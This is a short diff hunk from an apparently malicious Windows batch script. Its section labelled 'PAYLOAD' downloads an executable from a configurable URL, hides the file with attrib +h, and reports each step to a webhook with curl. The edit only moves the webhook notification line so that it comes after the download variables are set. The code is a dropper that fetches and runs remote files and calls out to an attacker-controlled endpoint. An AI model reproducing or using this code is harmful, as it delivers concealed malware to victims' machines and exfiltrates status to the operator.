@@ -153,9 +153,9 @@ cd %vpath%
 :: PAYLOAD - REMOVE GOTO IF YOU WANT THE SCRIPT TO DOWNLOAD AND RUN A FILE SOMEWHERE
 :: ---------------------------------------------------------------------------------
 goto skipcustomdownload
-	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Downloading and starting a custom file from\n%customdownloadurl% to %vpath%\%customfilename%```\"}" %webhook%
 	set "customdownloadurl=https://external.ext/file.exe"
         set "customfilename=c.exe"
+	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Downloading and starting a custom file from\n%customdownloadurl% to %vpath%\%customfilename%```\"}" %webhook%
 	IF EXIST "%customfilename%" GOTO waitloop4
 	curl --silent -L --fail "%customdownloadurl%" -o "%customfilename%"
 	>NUL attrib "%vpath%\%customfilename%" +h
